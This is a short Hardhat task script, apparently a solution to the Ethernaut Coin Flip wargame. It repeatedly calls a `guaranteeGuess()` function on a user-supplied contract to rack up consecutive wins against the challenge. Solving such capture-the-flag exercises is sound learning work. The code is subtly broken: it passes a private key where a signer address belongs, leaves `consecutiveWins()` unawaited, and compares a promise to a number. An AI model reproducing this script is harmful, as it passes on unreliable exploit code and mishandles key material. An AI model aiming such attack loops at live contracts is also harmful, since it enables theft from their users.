import { task } from "hardhat/config";
import { ethers } from "hardhat";
import { SignerWithAddress } from "@nomiclabs/hardhat-ethers/signers";
import * as dotenv from 'dotenv';
import { Contract, Signer } from "ethers";

dotenv.config();

export default task("attack-coin-flip", "Attacks the Ethernaut Coin Flip Contract")
  .addParam("contract", "The contract's address")
  .addParam("flips", "Number of flips")
  .setAction(async (taskArgs) => {
    const address: string = process.env.GOERLI_PRIVATE_KEY ? process.env.GOERLI_PRIVATE_KEY : '';
    const signer: Signer = await ethers.getSigner(address);
    const contractAddress: string = taskArgs.contract;
    const contract: Contract = await ethers.getContractAt('CoinFlip', contractAddress, signer);
    let wins = 0;
    
    for (let i = 0; i < taskArgs.flips; i++) {
        console.log("Guessing coin flip...")
        await contract.guaranteeGuess();
        wins = contract.consecutiveWins();
        console.log(`Consecutive Wins: ${wins}`);
    }

    (wins == taskArgs.flips) ? console.log("Attacked Successful") : console.log("Attacked Failed");

  });


